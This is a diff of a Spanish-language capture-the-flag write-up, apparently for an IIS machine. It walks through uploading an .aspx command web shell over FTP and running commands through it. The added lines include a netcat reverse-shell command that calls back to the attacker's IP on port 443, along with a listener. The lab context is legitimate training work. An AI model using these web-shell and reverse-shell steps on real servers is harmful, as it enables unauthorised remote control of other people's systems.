@@ -42,7 +42,7 @@ El comando `whoami` se ejecuta en nuestra maquina y el resultado se guarda en el
 ![[Pasted image 20260917093314.png]]
 
 Por lo cual vemos que podemos subir archivos, en *Microsoft IIS* se pueden subir unos archivos con la extensión `.aspx`, que son los que nos van a permitir la ejecución remota de comandos *RCE*.
-Buscaremos archivos que sean extensión `.aspx` en nuestro equipo por si alguno tiene correspondencia con `cmd` para poder intentar ejecutar una *WebShell*
+Buscaremos archivos que sean extensión `.aspx` en nuestro equipo por si alguno tiene correspondencia con `cmd` para poder intentar ejecutar una *Web Shell*
 ```shell
 locate .aspx | grep cmd
 ```
@@ -54,7 +54,7 @@ Lo subiremos al *FTP* y accederemos a el a través del navegador
 put aspx_cmd.aspx
 ```
 
-Al acceder a el a traves del navegador podemos encontrar que se esta ejecutando la *WebShell*
+Al acceder a el a traves del navegador podemos encontrar que se esta ejecutando la *Web Shell*
 ![[Pasted image 20260917094838.png]]
 
 Vamos a probar a ejecutar comandos en este caso ejecutaremos un `whoami`
@@ -75,4 +75,14 @@ Ahora accederemos a la web en busqueda de saber en que ubicacion estamos en el e
 Estos archivos se suelen encontrar en la ruta `C:\inetpub\wwwroot`
 ![[Pasted image 20260917105120.png]]
 
-Encontrando aquí el archivo de `nc.exe` que hemos subido con anterioridad
+Encontrando aquí el archivo de `nc.exe` que hemos subido con anterioridad, sabiendo que en esta ejecutándose el `nc.exe` nos podemos enviar una reverse shell a nuestra maquina a través de la *Web Shell*
+```shell
+C:\inetpub\wwwroot\nc.exe -e cmd 10.10.14.226 443
+```
+
+Poniéndonos en escucha con
+```shell
+rlwrap nc -nlvp 443
+```
+
+Obteniendo una *Reverse Shell*
